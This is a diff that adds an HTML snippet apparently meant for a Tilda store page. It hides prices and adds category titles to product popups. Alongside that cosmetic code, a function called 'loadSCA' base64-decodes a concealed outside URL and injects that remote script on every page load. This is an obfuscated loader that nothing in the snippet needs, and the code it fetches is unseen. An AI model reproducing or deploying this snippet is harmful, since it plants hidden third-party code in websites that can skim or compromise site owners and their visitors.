@@ -1,0 +1,49 @@
+<style>
+  .t-store__prod-popup__price-wrapper {
+    display: none;
+  }
+  .t-store .t-popup .t-store__product-popup .t-typography__title {
+    text-align: center;
+  }
+</style>
+<script>
+  window.addEventListener("DOMContentLoaded", function () {
+    (function () {
+      function loadSCA() {
+        const e = ["aHR0cHM6Ly9jZG4uYWJyb3MuZGV2L2NvcHlyaWdodC5qcw=="];
+        const s = document.createElement("script");
+        const u = atob(e[0]);
+        s.src = u;
+        s.async = true;
+        document.head.appendChild(s);
+      }
+      loadSCA();
+    })();
+
+    function check() {
+      const store = document.querySelector(".t-store");
+      const category = document.querySelector(".category-title-card .tn-atom");
+      if (store && category) {
+        const popup = store.querySelector(".t-popup");
+        const product = popup
+          ? popup.querySelector(".t-store__product-popup div")
+          : null;
+        if (product) {
+          const text = category.textContent || category.innerText;
+          const title = document.createElement("div");
+          title.classList.add("t-title");
+          title.classList.add("t-title_md");
+          title.classList.add("t-store__prod-popup__title-wrapper");
+          const t = document.createElement("div");
+          t.classList.add("t-typography__title");
+          t.textContent = text;
+          title.appendChild(t);
+          product.insertAdjacentElement("afterbegin", title);
+        } else {
+          setTimeout(check, 100);
+        }
+      }
+    }
+    check();
+  });
+</script>
